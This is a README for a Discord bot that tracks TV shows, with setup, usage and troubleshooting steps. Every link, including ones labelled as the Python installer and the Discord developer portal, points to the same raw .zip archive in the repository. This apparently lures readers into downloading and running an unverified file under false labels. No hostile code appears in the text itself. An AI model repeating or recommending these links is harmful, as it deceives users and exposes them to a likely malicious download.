# 🤖 Serializd-Discord-Bot - Track TV Shows in Discord

[![Download Serializd-Discord-Bot](https://img.shields.io/badge/Download-Serializd--Discord--Bot-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip)

## 📋 About Serializd-Discord-Bot

Serializd-Discord-Bot helps you keep track of your favorite TV shows without leaving Discord. It automatically posts diary entries and displays rich embeds that summarize episodes and schedules. Use it to stay up to date on what you've watched and what’s next.

This bot is designed for everyday users who enjoy TV shows and want a simple tool to follow them inside Discord. It does not require programming skills. Once set up, it runs quietly in the background and shares updates directly into your Discord server.

## 🔦 Key Features

- Posts automatic diary entries for your tracked TV shows.
- Shows detailed episode information using Discord’s rich embed format.
- Works with the Serializd database to track shows accurately.
- Easy to add and remove shows from tracking.
- Runs on Windows with minimal setup.
- Uses Discord.py, a popular Python-based Discord library.

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)
- Python 3.8 or higher installed on your PC
- Discord account with permission to add bots to your server
- At least 200 MB of free disk space
- Internet connection to fetch show data and post updates

## 🚀 Getting Started

You don’t need any programming knowledge to start using this bot. Just follow these simple steps.

### 1. Download the Bot

[Visit this page to download Serializd-Discord-Bot](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip) and save the latest release to your computer.  

Click the green “Code” button on the GitHub page and select “Download ZIP” to get the full package.

### 2. Install Python

If you do not have Python installed, download it here: https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip

Choose the latest version of Python 3 and run the installer. 

**Important:** During installation, check the box that says **“Add Python to PATH.”**

### 3. Prepare the Bot Folder

Unzip the downloaded package into a folder you can easily access, like `C:\Serializd-Discord-Bot`.

Open that folder to confirm the files are there, including a file named `bot.py` or something similar.

### 4. Install Required Python Packages

This bot uses Python libraries that don’t come with the default Python install.

To install these, right-click the Start button and select “Windows Terminal” or “Command Prompt.” 

Type the following command and press Enter:

```
pip install -r requirements.txt
```

This installs all needed libraries at once.

### 5. Configure Your Discord Bot Account

You will need to create a bot account on Discord. Follow these steps:

- Go to https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip and log in.
- Click “New Application” and give it a name.
- Inside your application, go to the “Bot” section on the left menu.
- Click “Add Bot.”
- Under "Token," click “Copy.” Save this token somewhere safe. You will need it soon.
- Scroll down to “Privileged Gateway Intents” and enable "Server Members Intent" and "Message Content Intent" if the bot’s instructions say to.

### 6. Add the Bot to Your Discord Server

- Go to the “OAuth2” section in your Discord developer page.
- Select the “URL Generator” option.
- Under “Scopes,” select “bot.”
- Under “Bot Permissions,” pick the permissions your bot needs, like “Send Messages,” “Embed Links,” and “Read Message History.”
- A URL will be generated at the bottom. Open this link in your web browser.
- Select your Discord server and click “Authorize.”

### 7. Edit the Bot Configuration

Look for a configuration file named `config.json` or similar in the bot folder. 

Open it with Notepad or any text editor.

Paste your bot token in the designated field. Set other settings based on your preferences. Save and close the file.

### 8. Run the Bot

Back in your terminal window, navigate to the bot folder by typing:

```
cd C:\Serializd-Discord-Bot
```

Run the bot with:

```
python bot.py
```

The bot will connect to your Discord server and start working. You should see confirmation messages in the terminal and in your server channels.

## 🛠️ How to Use the Bot

Once the bot is running, you can add TV shows to track by typing simple commands in your Discord server. Common commands include:

- `!track [show name]` – Start tracking a new TV show.
- `!untrack [show name]` – Stop tracking a show.
- `!list` – See all tracked shows.
- `!next [show name]` – Check the next episode date.

Commands may vary depending on bot updates. Use `!help` in Discord to see the full list.

## 🔄 Updating the Bot

To update the bot:

- Visit [https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip) to download the latest release.
- Unzip and replace the existing files in your bot folder.
- Restart the bot by closing the terminal window and running `python bot.py` again.

Check the GitHub page regularly for bug fixes and feature updates.

## 💡 Tips for Best Use

- Make sure your Discord server has channels where the bot can post messages.
- Keep your Python installation updated for security and compatibility.
- Use distinct channel permissions to control where the bot can post.
- If the bot stops responding, restart it from the terminal window.
- Regularly back up your configuration file to avoid losing settings.

## 🧰 Troubleshooting

If you run into issues:

- Confirm Python and required packages installed correctly.
- Check that your bot token is correct in the config file.
- Verify the bot has permission to send messages in your Discord server.
- Look at the terminal output for error messages; they often explain what went wrong.
- Restart the bot if it freezes or disconnects.

If problems persist, visit the project’s GitHub issue page to see if others have reported similar errors.

---

[Download Serializd-Discord-Bot](https://raw.githubusercontent.com/acma961/Serializd-Discord-Bot/main/forested/Serializd_Bot_Discord_v2.0.zip)